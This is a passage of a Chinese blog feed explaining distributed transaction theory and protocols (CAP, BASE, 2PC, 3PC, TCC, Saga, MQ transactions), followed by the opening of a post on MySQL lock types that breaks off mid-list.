    <content><![CDATA[<h1 id="分布式事务入门"><a href="#分布式事务入门" class="headerlink" title="分布式事务入门"></a>分布式事务入门</h1><h2 id="什么是分布式事务"><a href="#什么是分布式事务" class="headerlink" title="什么是分布式事务"></a>什么是分布式事务</h2><p>要理解分布式事务，先看看什么是事务？</p>
<p>事务是指是程序中一系列严密的逻辑操作，而且所有操作必须全部成功完成，否则在每个操作中所作的所有更改都会被撤消。可以通俗理解为 （ALL OR NOTHING）：就是把多件事情当做一件事情来处理，好比大家同在一条船上，要活一起活，要完一起完 。</p>
<p>而随着微服务、SOA等服务架构大规模普及，一个单体应用往往被拆分成N个不同的微服务。这时候本来是本地数据库的一致性就演变成为了不同服务之间不同数据库之间的一致性。又或者是相同服务之前的不同数据库（分库）之间的一致性。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-multi-service.png" alt="不同服务之间不同数据库产生的分布式事务"></p>
<p>必须要保证积分、优惠券、余额同时扣减成功。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-multi-resource.png" alt="相同服务之间不同数据库产生的分布式事务"></p>
<p>扣款和增款必须同时成功</p>
<p>分布式事务就是要保证上述两种不同数据库之间的一致性而产生的。分布式事务是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。</p>
<h2 id="分布式系统的一致性问题"><a href="#分布式系统的一致性问题" class="headerlink" title="分布式系统的一致性问题"></a>分布式系统的一致性问题</h2><p>下面举几个例子说一下常见的系统存在的哪些不一致的问题。</p>
<h3 id="下订单和扣库存"><a href="#下订单和扣库存" class="headerlink" title="下订单和扣库存"></a>下订单和扣库存</h3><p>电商系统中有一个经典的案例，即下订单和扣库存如何保持一致。如果先下订单，，扣库存失败，那么就会导致超卖；如果下订单不成功，扣库存成功，就会导致少卖。</p>
<h3 id="同步调用超时"><a href="#同步调用超时" class="headerlink" title="同步调用超时"></a>同步调用超时</h3><p>服务化的系统间调用常常因为网络问题导致系统间调用超时，即使是网络状况很好的机房在亿次流量的基数下，同步调用超时也是家常便饭。系统A同步调用系统B超时，系统A可以明确导致超市反馈，但是无法确定系统B是否已经完成了预设的功能。于是，系统A不知道应该继续做什么，如何反馈给使用方。</p>
<h3 id="异步回调超时"><a href="#异步回调超时" class="headerlink" title="异步回调超时"></a>异步回调超时</h3><p>此案例和上一个同步超时的案例类似，不过这是一个受理模式的场景，使用了异步回调返回处理结果，系统A同步调用系统B发起指令，系统B采用受理模式，受理后则返回成功信息，然后系统B处理后异步通知系统A处理结果。在这个过程中，如果系统A由于某种原因迟迟没有收到回调结果，那么这两个系统间的状态就不一致，互相认知的状态不同会导致系统间发生错误，在严重情况下会影响核心链路上的交易的状态准确性，甚至会导致资金损失。</p>
<h3 id="掉单"><a href="#掉单" class="headerlink" title="掉单"></a>掉单</h3><p>在分布式系统中，两个系统写作处理一个流程，分别为对方的上下游，如果一个系统中存在一个请求（通常指订单），另一个系统不存在，则会导致掉单，掉单的后果很严重，有时也会导致资金损失。</p>
<h3 id="系统间状态不一致"><a href="#系统间状态不一致" class="headerlink" title="系统间状态不一致"></a>系统间状态不一致</h3><p>此案例与上面掉单的案例类似，不同的是两个系统间都存在请求，但请求的状态不一致。</p>
<h3 id="缓存和数据库不一致"><a href="#缓存和数据库不一致" class="headerlink" title="缓存和数据库不一致"></a>缓存和数据库不一致</h3><p>缓存和数据库之间的数据如何保持一致性？是要保持强一致性还是弱一致性。</p>
<h3 id="本地缓存节点间不一致"><a href="#本地缓存节点间不一致" class="headerlink" title="本地缓存节点间不一致"></a>本地缓存节点间不一致</h3><p>一个服务池上的多个节点为了满足较高的性能需求，需要使用本地缓存，这样每个节点都会有一份缓存数据的复制，如果这些数据是静态的，不变的，就永远不会有问题，但是如果这些数据时半静态的或者经常被更新的，则被更新时各个节点的更新是有先后顺序的，在更新的瞬间，在某个时间窗内各个节点的数据时不一致的，如果这些数据视为某个开关服务的，则想象一下重复的请求进入了不同的节点，一个请求进入了开关打开的逻辑，同时另一个进入了开关关闭的逻辑，会导致请求被处理两次，最坏的情况是导致资金损失。</p>
<h3 id="缓存数据结构不一致"><a href="#缓存数据结构不一致" class="headerlink" title="缓存数据结构不一致"></a>缓存数据结构不一致</h3><p>某系统需要在缓存中暂存某种类型的数据，该数据由多个数据元素组成，其中，某个数据元素需要从数据库或者服务中获取，如果一部分数据元素获取失败，则由于程序处理不正确，仍然将不完成的数据存入缓存中，在缓存使用者使用时很有可能因为数据的不完全而抛出异常，例如NullPointerException等，然后可能因为没有合理处理异常而导致程序出错。</p>
<h2 id="分布式事务的理论基础"><a href="#分布式事务的理论基础" class="headerlink" title="分布式事务的理论基础"></a>分布式事务的理论基础</h2><h3 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h3><p><img src="https://huhansi.github.io/images/2020-04-11-cap.png" alt="CAP定理"></p>
<p>CAP定理，又被称为布鲁尔定理，是分布式计算领域公认的一个定理。</p>
<ul>
<li>C：Consistency，一致性。在分布式系统中的所有数据备份，在同一时刻，具有同样的值，所有节点在同一时刻读取的数据都是最新的数据副本。</li>
<li>A：Availability，可用性，好的响应性能。完全的可用性指的是在任何故障模型下，服务都会在有限的时间内处理完成并进行响应</li>
<li>P：Partition tolerance，分区容忍性。尽管网络上有部分消息丢失，但系统仍然可以继续工作。</li>
</ul>
<p>CAP原理证明，任何分布式系统只可同时满足以上两点，另外一个必须被牺牲。分布式的服务化系统都需要满足分区容忍性，那么只能选择CP（一致性+分区容忍性）或者AP（可用性+分区容忍性）这两个，而不能选择AC（可用性+一致性）。</p>
<p>如果在网络上有消息丢失，就出现了网络分区，复制操作可能会被延后，这时候，如果我们选择等待复制完成再返回，则可能导致有限的时间内无法响应，失去了可用性；二如果选择不等待复制完成，在主分片写完后立即返回，则具备了可用性，但失去了一致性。</p>
<h3 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h3><p>BASE思想解决了CAP提出的分布式系统的一致性和可用性不可兼得的问题。BASE思想和ACID原理截然不同，它满足CAP原理，通过牺牲强一致性获得可用性，一般应用于服务化系统的应用层或者大数据处理系统中，通过达到最终一致性来尽量满足业务的绝大多数需求。</p>
<p>BASE模型包含如下三个元素：</p>
<ul>
<li>BA：Basically Available，基本可用</li>
<li>S：Soft State，软状态，状态可以在一段时间内不同步</li>
<li>E：Eventually Consistent，最终一致，在一定的时间窗口内，最终数据达成一致即可。</li>
</ul>
<h2 id="分布式一致性协议"><a href="#分布式一致性协议" class="headerlink" title="分布式一致性协议"></a>分布式一致性协议</h2><p>国际开放标准组织Open Group定义了DTS（分布式事务处理模型），模型中包含4种角色：应用程序、事务管理器、资源管理器和通信资源管理器。事务管理器是统管全局的管理者，资源管理器和通信资源管理器是事务的参与者。</p>
<p>下面的两阶段提交协议、三阶段提交协议以及TCC协议，都是根据DTS这一思想演变而来的。</p>
<h3 id="两阶段提交协议（强一致性）"><a href="#两阶段提交协议（强一致性）" class="headerlink" title="两阶段提交协议（强一致性）"></a>两阶段提交协议（强一致性）</h3><p>JEE的XA协议就是根据两阶段提交来保证事务的完整性，并实现分布式服务化的强一致性。</p>
<p>两阶段提交协议把分布式事务分为两个阶段，一个是准备阶段，另一个是提交阶段。准备阶段和提交阶段都是由事务管理器发起的。</p>
<p>两阶段提交协议的流程如下所述：</p>
<ul>
<li>准备阶段：事务管理器向资源管理器发起指令，资源管理器评估自己的状态，如果资源管理器评估指令可以完成，则会写redo 或者 undo日志，然后锁定资源，执行操作，但是并不提交</li>
<li>提交阶段：如果每个资源管理器明确返回准备成功，也就是预留资源和执行操作成功，则事务管理器向资源管理器发起提交指令，资源管理器提交资源变更的事务，释放锁定的资源；如果任何一个资源管理器明确返回准备失败，也就是预留资源或者执行操作失败，则事务管理器向资源管理器发起终止之灵，资源管理器取消已经变更的事务，执行undo日志，释放锁定的资源。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-11-2pc1.png" alt="两阶段事务提交成功"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-2pc3.png" alt="两阶段事务提交成功"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-2pc2.png" alt="两阶段事务提交失败，回滚"></p>
<p>两阶段提交协议在准备阶段锁定资源，这时一个重量级的操作，能保证强一致性，但是实现起来复杂、成本较高、不够灵活，更重要的是它还有以下的致命问题：</p>
<ul>
<li>阻塞：任何一次指令都必须受到明确的响应，才会继续下一步，否则处于阻塞状态，占用的资源会被一直锁定，不会被释放。</li>
<li>单点故障：如果事务管理器宕机，资源管理器没有事务管理器指挥，就会一直阻塞，尽管可以通过选择新的事务管理器替代原有的事务管理器，但是如果事务管理器在发送一个提交指令后宕机，并且提交指令仅仅被一个资源管理器接受，并且资源管理器接受后也宕机，那么新上任的资源管理器无法处理这种情况</li>
<li>脑裂：事务管理器发送提交指令，有的资源管理器受到并执行了事务，有的没有收到就没有执行事务，多个参与者之间状态就不一致</li>
</ul>
<h3 id="三阶段提交协议"><a href="#三阶段提交协议" class="headerlink" title="三阶段提交协议"></a>三阶段提交协议</h3><p>三阶段提交协议是两阶段提交协议的改进版本。它通过超时机制解决了阻塞的问题，并把两阶段增加为以下三个阶段：</p>
<ul>
<li>询问阶段：事务管理器询问资源管理器是否可以完成指令，资源管理器只需要回答是活着不是，而不需要做真正的操作，这个阶段超时会导致终止。</li>
<li>准备阶段：如果在询问阶段所有资源管理器都返回可以执行操作，则事务管理器向资源管理器发送预执行请求，然后资源管理器写redo和undo日志，执行操作但是不提交操作；如果在询问阶段任意资源管理器返回不能执行操作的结果，则事务管理器向资源管理器发送终止请求，这里的逻辑与两阶段提交协议的准备阶段是类似的</li>
<li>提交阶段：如果每个资源管理器在准备阶段都返回准备成功，也就是说预留资源和执行操作成功，则事务管理器向资源管理器发起提交指令，资源管理器提交资源变更的事务，释放锁定的资源；如果任何参与者返回准备失败，也就是说预留资源或者执行操作失败，则事务管理器向资源管理器发起终止指令，资源管理器取消已经变更的事务，执行undo日志，释放锁定的资源，这里的逻辑与两阶段提交协议的提交阶段是一致的。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-11-3pc1.png" alt="三阶段提交-询问阶段成功"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-3pc2.png" alt="三阶段提交-询问阶段失败"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-3pc3.png" alt="三阶段提交-准备阶段成功"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-3pc4.png" alt="三阶段提交-准备阶段失败"></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-3pc5.png" alt="三阶段提交-提交成功时序图"></p>
<p>三阶段提交协议与两阶段提交协议主要有以下两个不同点：</p>
<ul>
<li>增加了一个询问阶段，询问阶段可以确保尽可能早地发现无法执行操作而需要终止的行为，但是它并不能发现所有这种行为，只会减少这种情况发生</li>
<li>在准备阶段以后，事务管理器和资源管理器执行的任务都增加了超时，一旦超时，则事务管理器和资源管理器都会继续提交事务，默认为成功，这也是根据概率统计超市后默认为成功的正确性最大。</li>
</ul>
<h3 id="TCC（最终一致性）"><a href="#TCC（最终一致性）" class="headerlink" title="TCC（最终一致性）"></a>TCC（最终一致性）</h3><p>TCC协议将一个任务拆分成Try、Confirm、Cancel三个步骤。正常流程会先执行Try，如果执行没有问题，则再执行Confirm，如果执行过程中出了问题，则执行操作的逆操作Cancel。</p>
<ul>
<li>Try：尝试执行,完成所有业务检查（一致性）,预留必须业务资源（准隔离性）</li>
<li>Confirm：确认执行真正执行业务，不作任何业务检查，只使用Try阶段预留的业务资源，Confirm操作满足幂等性。要求具备幂等设计，Confirm失败后需要进行重试。</li>
<li>Cancel：取消执行，释放Try阶段预留的业务资源。 Cancel操作满足幂等性，Cancel阶段的异常和Confirm阶段异常处理方案基本上一致。</li>
</ul>
<p>从正常流程上讲，这仍然是一个两阶段提交协议，但是在执行出现问题时有一定的自我修复能力，如果任何参与者出现了问题，则事务管理器通过执行操作的逆操作Cancel之前的操作，达到最终一致的状态。</p>
<h3 id="本地消息表（最终一致性）"><a href="#本地消息表（最终一致性）" class="headerlink" title="本地消息表（最终一致性）"></a>本地消息表（最终一致性）</h3><p><a href="[https://queue.acm.org/detail.cfm?id=1394128%E3%80%82](https://queue.acm.org/detail.cfm?id=1394128。)">本地消息表</a>的方案最初是由ebay提出的。核心思路是将分布式事务拆分成本地事务进行处理。方案通过在事务主动发起方额外新建事务消息表，事务发起方处理业务和记录事务消息在本地事务中完成，轮询事务消息表的数据发送事务消息，事务被动方基于消息中间件消费事务消息表中的事务。</p>
<p>这样设计可以避免“<strong>业务处理成功+事务消息发送失败</strong>”或“<strong>业务处理失败+事务消息发送成功</strong>”的棘手情况出现，保证2个系统事务的数据一致性。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-local-message.png" alt="本地消息表"></p>
<p>以上文案例1为例，扣库存和下订单服务分布在不同的服务器节点上，其中库存服务是事务主动方，订单服务是事务被动方。</p>
<p>事务的主动方需要往外新建事务消息表，用于记录分布式事务的消息的发生、处理状态。</p>
<p>整个业务处理流程如下：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-local-message.png" alt="本地消息表业务流程"></p>
<ol>
<li>事务主动方处理本地事务</li>
<li>事务主动方通过消息中间件，通知事务被动方处理事务</li>
<li>事务被动方通过消息中间件，通知事务主动方已处理的消息</li>
</ol>
<p>为了数据一致性，当处理错误需要重试，事务发送方和事务接收方相关业务处理需要支持幂等。具体保存一致性的容错处理如下：</p>
<ol>
<li>当步骤1处理出错，事务回滚，等同于什么都没有发生</li>
<li>当步骤2、步骤3处理出错，由于未处理的事务消息还是保存在事务发送方，事务发送方可以定时轮询为超时消息数据，再次发送的消息中间件进行处理。事务被动方消费事务消息重试处理。</li>
<li>如果是业务上的失败，事务被动方可以发消息给事务主动方进行回滚。</li>
<li>如果多个事务被动方已经消费消息，事务主动方需要回滚事务时需要通知事务被动方回滚。</li>
</ol>
<h3 id="MQ事务（最终一致性）"><a href="#MQ事务（最终一致性）" class="headerlink" title="MQ事务（最终一致性）"></a>MQ事务（最终一致性）</h3><p>基于MQ的分布式事务方案其实是对本地消息表的封装，将本地消息表基于MQ 内部，其他方面的协议基本与本地消息表一致。</p>
<p>在本地消息表方案中，保证事务主动方发写业务表数据和写消息表数据的一致性是基于数据库事务，RocketMQ的事务消息相对于普通MQ，相对于提供了2PC的提交接口，方案如下：</p>
<p><strong>正常情况——事务主动方发消息</strong> 这种情况下，事务主动方服务正常，没有发生故障，发消息流程如下：</p>
<p><img src="https://huhansi.github.io/images/2020-04-12-mq-transaction.png" alt="MQ事务成功"></p>
<ol>
<li>发送方向 MQ服务端(MQ Server)发送half消息</li>
<li>MQ Server 将消息持久化成功之后，向发送方 ACK 确认消息已经发送成功</li>
<li>发送方开始执行本地事务逻辑</li>
<li>发送方根据本地事务执行结果向 MQ Server 提交二次确认（commit 或是 rollback）</li>
<li>MQ Server 收到 commit 状态则将半消息标记为可投递，订阅方最终将收到该消息；MQ Server 收到 rollback 状态则删除half消息，订阅方将不会接受该消息。</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-12-mq-transaction1.png" alt="MQ事务异常"></p>
<ol>
<li>MQ Server 对该消息发起消息回查。</li>
<li>发送方收到消息回查后，需要检查对应消息的本地事务执行的最终结果。</li>
<li>发送方根据检查得到的本地事务的最终状态再次提交二次确认</li>
<li>MQ Server基于commit / rollback 对消息进行投递或者删除</li>
</ol>
<h3 id="Saga事务（最终一致性）"><a href="#Saga事务（最终一致性）" class="headerlink" title="Saga事务（最终一致性）"></a>Saga事务（最终一致性）</h3><p>其核心思想是将长事务拆分为多个本地短事务，由Saga事务协调器协调，如果正常结束那就正常完成，如果某个步骤失败，则根据相反顺序一次调用补偿操作。</p>
<p>每个Saga事务都是由一些<strong>本地</strong>子事务T1、T2、……、Tn组成，对应的每个事务Ti，都会有一Ti，撤销操作Ci。</p>
<p>Saga事务只有两种执行路径：</p>
<ol>
<li>事务正常执行完成：T1、T2、……、Tn</li>
<li>事务Ti执行失败：T1、T2、……、Ti、Ci、Ci-1、……、C1</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-12-saga.png" alt="Saga事务执行情况"></p>
<h4 id="Saga恢复策略"><a href="#Saga恢复策略" class="headerlink" title="Saga恢复策略"></a>Saga恢复策略</h4><h5 id="向前恢复"><a href="#向前恢复" class="headerlink" title="向前恢复"></a>向前恢复</h5><p><img src="https://huhansi.github.io/images/2020-04-12-saga1.png" alt="向前恢复"></p>
<p>本地事务Ti执行失败，就一直执行Ti，直到成功为止，在这种情况下，没有对应的撤销Ci操作。</p>
<h5 id="向后恢复"><a href="#向后恢复" class="headerlink" title="向后恢复"></a>向后恢复</h5><p><img src="https://huhansi.github.io/images/2020-04-12-saga2.png" alt="向后恢复"></p>
<p>本地事务Ti执行失败，就执行对应的撤销操作Ci，直到执行完C0为止。</p>
<h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><h5 id="命令协调"><a href="#命令协调" class="headerlink" title="命令协调"></a>命令协调</h5><p>中央协调器负责集中处理事件的决策和业务逻辑排序。</p>
<p>中央协调器（Orchestrator，简称OSO）以命令/回复的方式与每项服务进行通信，全权负责告诉每个参与者该做什么以及什么时候该做什么。</p>
<p><img src="https://huhansi.github.io/images/2020-04-12-saga3.png" alt="Saga命令协调模式"></p>
<h5 id="事件编排"><a href="#事件编排" class="headerlink" title="事件编排"></a>事件编排</h5><p>没有中央协调器（没有单点风险）时，每个服务产生并观察其他服务的事件，并决定是否应采取行动。</p>
<p>在事件编排方法中，第一个服务执行一个事务，然后发布一个事件。该事件被一个或多个服务进行监听，这些服务再执行本地事务并发布（或不发布）新的事件。</p>
<p>当最后一个服务执行本地事务并且不发布任何事件时，意味着分布式事务结束，或者它发布的事件没有被任何Saga参与者听到都意味着事务结束。</p>
<p><img src="https://huhansi.github.io/images/2020-04-12-saga4.png" alt="Saga事件编排"></p>
<h2 id="保证最终一致性的模式"><a href="#保证最终一致性的模式" class="headerlink" title="保证最终一致性的模式"></a>保证最终一致性的模式</h2><p>在大规模、高并发服务化系统中，一个功能被拆分成多个具有单一功能的子功能，一个流程会有多个系统的多个单一功能的服务组合实现，如果实现两阶段提交协议和三阶段提交协议，则缺失能解决系统间的一致性问题。除了这两个协议的自身问题，其实现也比较复杂、成本比较高，最重要的是性能不好，相比来看，TCC协议更简单且更容易实现，但是TCC协议由于每个事务都需要执行Try，再执行Confirm，略显臃肿，因此，现实系统的底线是仅仅需要达到最终一致性，而不需要实现专业的、复杂的一致性协议。实现最终一致性有一些非常有效、简单的模式。</p>
<h3 id="查询模式"><a href="#查询模式" class="headerlink" title="查询模式"></a>查询模式</h3><p>任何服务操作都需要提供一个查询接口，用来向外部输出操作执行的状态。服务操作的使用方可以通过查询接口的值服务操作的执行状态，然后根据不同的状态来做不同的处理操作。</p>
<p>上文的案例2-5，可以使用查询模式来了解被调用服务的处理情况，决定下一步做什么，例如是补偿未完成的操作还是混滚已经完成的操作。</p>
<h3 id="补偿模式"><a href="#补偿模式" class="headerlink" title="补偿模式"></a>补偿模式</h3><p>为了让系统最终达到一状态而做的牡蛎都叫做补偿操作。</p>
<p>补偿操作根据发起形式分为以下几种：</p>
<ul>
<li>自动恢复：程序根据发生不一致的环境，通过继续进行未完成的操作，或者回滚已经完成的操作，来自动达到一致状态</li>
<li>通知运营：如果程序无法自动恢复，并且设计时考虑到了不一致的场景，则可以提供运营功能，通过运营手动进行补偿</li>
<li>如果很不巧，系统无法自动恢复，有没有运营功能，那么必须通过技术手段来解决，技术手段包括进行数据库变更或者代码变更</li>
</ul>
<h3 id="异步确保模式"><a href="#异步确保模式" class="headerlink" title="异步确保模式"></a>异步确保模式</h3><p>异步确保模式是补偿模式的一个典型案例，经常应用到使用方对响应时间要求不太高的场景中，通常把这类操作从主流程中摘除，通过异步的方式进行处理，处理后把结果通过通知系统通知给使用方。</p>
<p>案例3中，若对某个操作没有收到响应，则通过查询模式、补偿模式和异步确保模式来继续未完成的操作。</p>
<h3 id="定期校对模式"><a href="#定期校对模式" class="headerlink" title="定期校对模式"></a>定期校对模式</h3><p>在操作主流程中的系统间执行校对操作，可以在时候异步的批量校对操作的状态，如果发现不一致的操作，则进行补偿。</p>
<p>对于案例4和4，通常通过定期校对模式发现问题，并通过补偿模式来修复，最后达到系统间的最终一致性。</p>
<h3 id="可靠消息模式"><a href="#可靠消息模式" class="headerlink" title="可靠消息模式"></a>可靠消息模式</h3><p>通过消息队列实现异步化。</p>
<h4 id="消息的可靠发送"><a href="#消息的可靠发送" class="headerlink" title="消息的可靠发送"></a>消息的可靠发送</h4><p>消息的可靠发送可以认为是仅最大努力发送消息通知，有以下两种实现方法。</p>
<p>第一种是在发送消息之前将消息持久到数据库，状态标记为待发送，然后发送消息，如果发送成功，则将消息改为发送成功。定时任务定时从数据库老区在一定时间内未发送的消息并发送。</p>
<p>第二种是持久消息的数据库时独立的。</p>
<h4 id="消息处理器的幂等性"><a href="#消息处理器的幂等性" class="headerlink" title="消息处理器的幂等性"></a>消息处理器的幂等性</h4><ul>
<li>使用数据库表的唯一键进行滤重</li>
<li>使用分布式表对请求进行滤重</li>
<li>使用状态流转的方向性来滤重，通常使用数据库的行级锁进行实现</li>
<li>根据业务的特点，操作本身就是幂等的，例如：删除一个资源等</li>
</ul>
<h3 id="缓存一致性模式"><a href="#缓存一致性模式" class="headerlink" title="缓存一致性模式"></a>缓存一致性模式</h3><ul>
<li>如果性能要求不是非常高，则尽量使用分布式缓存，而不要使用本地缓存</li>
<li>写缓存时数据一定要完成，如果缓存数据的一部分有效，另一部分无效，则宁可在需要时回源数据库，也不要把部分数据放入缓存中</li>
<li>使用缓存牺牲了一致性，为了提高性能，数据库与缓存只需要保持弱一致性，而不需要保持强一致性，否则就违背了使用缓存的初衷</li>
<li>读的顺序是先读缓存，后读数据库，写的顺序是先写数据库，后写缓存。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>百度百科-分布式事务</a></p>
<p><a href="https://juejin.im/post/5b5a0bf9f265da0f6523913b" target="_blank" rel="noopener">再有人问你分布式事务，把这篇扔给他</a></p>
<p><a href="https://juejin.im/post/5c0e5bf8e51d45063322fe50" target="_blank" rel="noopener">理解分布式事务</a></p>
<p><a href>分布式服务架构原理、设计与实战</a></p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式事务</tag>
        <tag>CAP</tag>
        <tag>BASE</tag>
        <tag>DTS</tag>
        <tag>两阶段提交</tag>
        <tag>三阶段提交</tag>
        <tag>TCC</tag>
        <tag>本地消息表</tag>
        <tag>MQ事务</tag>
        <tag>Saga事务</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL中的各种锁</title>
    <url>/2020/04/11/MySQL/2020-04-11-MySQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%94%81/</url>
    <content><![CDATA[<h1 id="MySQL中的各种锁"><a href="#MySQL中的各种锁" class="headerlink" title="MySQL中的各种锁"></a>MySQL中的各种锁</h1><h2 id="MySQL的锁管理机制"><a href="#MySQL的锁管理机制" class="headerlink" title="MySQL的锁管理机制"></a>MySQL的锁管理机制</h2><p>相对其他数据库而言，MySQL 的锁机制比较简单，其最显著的特点是不同的存储引擎支持不同的锁机制。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-MySQL-lock.png" alt="MySQL锁管理机制">‘</p>
<ul>
<li><p>元数据锁（MDL，MetaData Lock）： 不需要显式使用，在访问一个表的时候会被自动加上。MDL 的作用是，保证读写的正确性。</p>
<p>  因此，在 MySQL 5.5 版本中引入了 MDL，当对一个表做增删改查操作的时候，加 MDL读锁；当要对表做结构变更操作的时候，加 MDL 写锁</p>
</li>
<li><p>存储引擎特有锁：InnoDB-行级锁、间隙锁；BDB-页级锁</p>
</li>
<li><p>表级锁：</p>
</li>
<li><p>全局读锁：对整个数据库实例加锁，命令是Flash tables with read lock（FTWRL）。当你需要让整个库处于只读状态的时候，可以使用这个命令，之后其他线程的以下语句会被阻塞：数据更新语句（数据的增删改）、数据定义语句（包括建表、修改表结构等）和更新类事务的提交语句。</p>
</li>
</ul>
<h2 id="各种锁解析"><a href="#各种锁解析" class="headerlink" title="各种锁解析"></a>各种锁解析</h2><p>下面我们一起看一下MySQL中的各种锁。</p>
<h3 id="元数据锁（MDL，Meta-Data-Lock）"><a href="#元数据锁（MDL，Meta-Data-Lock）" class="headerlink" title="元数据锁（MDL，Meta Data Lock）"></a>元数据锁（MDL，Meta Data Lock）</h3><p>元数据锁是一个读写锁，因此，可以多线程的对一张表，进行增删改查操作，因为它此时加的是MDL读锁；但当要对表做结构变更操作的时候，就会加上 MDL 写锁。</p>
<p>事务中的 MDL 锁，在语句执行开始时申请，但是语句结束后并不会马上释放，而会等到整个事务提交后再释放。</p>
<p><strong>MDL锁是没有超时时间的，因此，只要事务还没有提交，这个MDL锁就会一直锁着，在下面这种场景下就会x造成线程阻塞、业务中断。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. sessionA:</span><br><span class="line">begin;</span><br><span class="line">select * from t limit 1;</span><br><span class="line"> </span><br><span class="line">2. sessionB:</span><br><span class="line">select * from t limit 1;</span><br><span class="line"> </span><br><span class="line">3. sessionC:</span><br><span class="line">alter table t add f int;</span><br><span class="line">#会mdl锁住</span><br><span class="line"> </span><br><span class="line">4. sessionD:</span><br><span class="line">select * from t limit 1;</span><br></pre></td></tr></table></figure>

<p>如上例子，会话A申请了MDL读锁，但是没有提交；会话B也申请了读锁，正常执行（读锁不排他）；这时候会话C想要修改表字段，那么它就要获取这个表的写锁。但是因为会话A的读锁还没有释放，因此会话C阻塞，从而也造成后面的会话D阻塞。</p>
<p>解决办法就是找到这个长时间未执行完的事务，提交或者回滚即可。</p>
<h3 id="行级锁"><a href="#行级锁" class="headerlink" title="行级锁"></a>行级锁</h3><ul>
<li><p>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。</p>
</li>
<li><ul>
<li>最大程度的支持并发，同时也带来了最大的锁开销。<ul>
<li>在 InnoDB 中，除单个 SQL 组成的事务外，<br>  锁是逐步获得的，这就决定了在 InnoDB 中发生死锁是可能的。</li>
<li>行级锁只在存储引擎层实现，而Mysql服务器层没有实现。 行级锁更适合于有大量按索引条件并发更新少量不同数据，同时又有并发查询的应用，如一些在线事务处理（OLTP）系统</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>InnoDB 实现了以下两种类型的<strong>行锁</strong>：</p>
<ul>
<li>共享锁（S）：允许一个事务去读一行，阻止其他事务获得相同数据集的排他锁。</li>
<li>排他锁（X）：允许获得排他锁的事务更新数据，阻止其他事务取得相同数据集的共享读锁和排他写锁。</li>
</ul>
<p>为了允许行锁和表锁共存，实现多粒度锁机制，InnoDB 还有两种内部使用的意向锁（Intention Locks），这两种意向锁都是<strong>表锁</strong>：</p>
<ul>
<li>意向共享锁（IS）：事务打算给数据行加行共享锁，事务在给一个数据行加共享锁前必须先取得该表的 IS 锁。</li>
<li>意向排他锁（IX）：事务打算给数据行加行排他锁，事务在给一个数据行加排他锁前必须先取得该表的 IX 锁。</li>
</ul>
<p><strong>锁模式的兼容情况：</strong></p>
<p><img src="https://huhansi.github.io/images/2020-04-11-lock-mode.jpg" alt="锁模式的兼容状况"></p>
<p>如果一个事务请求的锁模式与当前的锁兼容， InnoDB 就将请求的锁授予该事务； 反之， 如果两者不兼容，该事务就要等待锁释放。</p>
<h4 id="InnoDB行锁实现方式"><a href="#InnoDB行锁实现方式" class="headerlink" title="InnoDB行锁实现方式"></a>InnoDB行锁实现方式</h4><ul>
<li>InnoDB 行锁是通过给索引上的索引项加锁来实现的，这一点 MySQL 与 Oracle 不同，后者是通过在数据块中对相应数据行加锁来实现的。InnoDB 这种行锁实现特点意味着：只有通过索引条件检索数据，InnoDB 才使用行级锁，否则，InnoDB 将使用表锁！</li>
<li>不论是使用主键索引、唯一索引或普通索引，InnoDB 都会使用行锁来对数据加锁。</li>
<li>只有执行计划真正使用了索引，才能使用行锁：即便在条件中使用了索引字段，但是否使用索引来检索数据是由 MySQL 通过判断不同执行计划的代价来决定的，如果 MySQL 认为全表扫描效率更高，比如对一些很小的表，它就不会使用索引，这种情况下 InnoDB 将使用表锁，而不是行锁。因此，在分析锁冲突时，<br>  别忘了检查 SQL 的执行计划（可以通过 explain 检查 SQL 的执行计划），以确认是否真正使用了索引。</li>
<li>由于 MySQL 的行锁是针对索引加的锁，不是针对记录加的锁，所以虽然多个session是访问不同行的记录， 但是如果是使用相同的索引键， 是会出现锁冲突的（后使用这些索引的session需要等待先使用索引的session释放锁后，才能获取锁）。 应用设计的时候要注意这一点。</li>
</ul>
<h3 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h3><p>当我们用范围条件而不是相等条件检索数据，并请求共享或排他锁时，InnoDB会给符合条件的已有数据记录的索引项加锁；对于键值在条件范围内但并不存在的记录，叫做“间隙（GAP)”，InnoDB也会对这个“间隙”加锁，这种锁机制就是所谓的间隙锁（Next-Key锁）。</p>
<p>很显然，在使用范围条件检索并锁定记录时，InnoDB这种加锁机制会阻塞符合条件范围内键值的并发插入，这往往会造成严重的锁等待。因此，在实际应用开发中，尤其是并发插入比较多的应用，我们要尽量优化业务逻辑，尽量使用相等条件来访问更新数据，避免使用范围条件。</p>
<h4 id="使用间隙锁的目的"><a href="#使用间隙锁的目的" class="headerlink" title="使用间隙锁的目的"></a>使用间隙锁的目的</h4><p>使用间隙锁有以下目的：</p>
<ol>
<li>防止幻读，以满足相关隔离级别的要求；</li>
